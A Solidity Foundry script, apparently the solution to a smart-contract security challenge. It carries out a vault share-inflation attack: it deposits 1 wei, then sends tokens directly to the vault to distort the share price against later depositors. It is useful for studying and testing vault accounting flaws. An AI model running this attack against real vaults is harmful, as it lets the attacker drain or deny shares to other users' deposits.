// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script} from "../../../lib/forge-std/src/Script.sol";
import { IVault } from "../src/interfaces/IVault.sol";
import { IERC20 } from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import { console } from "forge-std/console.sol";

contract ReverseRugpulled is Script{

    function run() public {

        uint256 deployPvtKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployPvtKey);
        address vaultAdd = vm.envAddress("VAULT");
        IVault vault = IVault(vaultAdd);
        address tokenAdd = vm.envAddress("TOKEN");
        IERC20 token = IERC20(tokenAdd);
        uint totalShares = vault.totalShares();

        token.approve(address(vault), 9 * 10 ** 18);
        vault.deposit(1 wei);

        console.log("Total Shares in the vault:", totalShares);

        token.transfer(address(vault), 7 ether);
        console.log("Vault balance:", token.balanceOf(vaultAdd));
        console.log("Total Shares in the vault after transfer:", vault.totalShares());
    }

}
